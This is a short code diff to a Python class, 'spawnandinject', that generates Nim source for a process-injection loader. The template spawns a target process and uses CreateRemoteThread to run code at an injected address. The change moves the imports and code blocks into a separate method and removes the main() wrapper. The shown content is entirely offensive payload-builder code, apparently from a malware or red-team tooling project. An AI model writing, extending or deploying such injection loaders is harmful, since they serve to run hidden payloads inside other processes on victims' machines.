@@ -16,13 +16,11 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return Template("""
-{imports}
-{codeblocks}
-
-proc main() =
-    
     {transformers}
 
     var si: STARTUPINFOA
@@ -37,6 +35,4 @@ proc main() =
     let hThread = CreateRemoteThread(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
     WaitForSingleObject(hThread, 500)
     CloseHandle(hThread)
-
-main()
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
